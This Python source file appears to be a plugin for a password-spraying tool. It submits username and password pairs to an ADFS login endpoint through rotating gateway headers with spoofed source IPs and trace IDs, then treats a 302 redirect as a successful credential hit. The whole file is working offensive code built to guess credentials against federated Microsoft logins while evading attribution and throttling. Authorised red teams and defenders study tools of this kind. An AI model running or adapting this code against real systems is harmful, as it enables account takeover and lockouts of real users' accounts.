import datetime, requests
from utils.utils import generate_ip, generate_id, generate_trace_id


def adfs_authenticate(url, username, password, useragent, pluginargs):

    ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')

    data_response = {
        'timestamp': ts,
        'username': username,
        'password': password,
        'success': False,
        'change': False,
        '2fa_enabled': False,
        'type': None,
        'code': None,
        'name': None,
        'action': None,
        'headers': [],
        'cookies': [],
        'sourceip': None,
        'throttled': False,
        'error': False,
        'output': ""
    }

    # post_data = urllib.parse.urlencode({'UserName': username, 'Password': password,
    #                                    'AuthMethod': 'FormsAuthentication'}).encode('ascii')
    post_data = {
        'UserName': username,
        'Password': password,
        'AuthMethod': 'FormsAuthentication'
    }

    # ?client-request-id=&wa=wsignin1.0&wtrealm=urn:federation:MicrosoftOnline&wctx=cbcxt=&username={}&mkt=&lc=
    params_data =  {
        'client-request-id' : '',
        'wa' : 'wsignin1.0',
        'wtrealm' : 'urn:federation:MicrosoftOnline',
        'wctx' : '',
        'cbcxt' : '',
        'username' : username,
        'mkt' : '',
        'lc' : ''
    }

    spoofed_ip = generate_ip()  # maybe use client related IP address
    amazon_id = generate_id()
    trace_id = generate_trace_id()

    headers = {
        'User-Agent': useragent, # suggestion: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
        "X-My-X-Forwarded-For": spoofed_ip,
        "x-amzn-apigateway-api-id": amazon_id,
        "X-My-X-Amzn-Trace-Id": trace_id,

        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9, image/webp,*/*;q=0.8'
    }

    try:

        resp = requests.post("{}/adfs/ls/".format(url), headers=headers, params=params_data, data=post_data, allow_redirects=False)
        data_response['code'] = resp.status_code

        if resp.status_code == 302:
            data_response['success'] = True
            data_response['output'] = 'SUCCESS_MESSAGE: => {}:{}'.format(
                username, password)

        else:  # fail
            data_response['success'] = False
            data_response['output'] = 'FAILURE_MESSAGE: {} => {}:{}'.format(
                resp.status_code, username, password)

    except Exception as ex:
        data_response['error'] = True
        data_response['output'] = ex
        pass

    return data_response
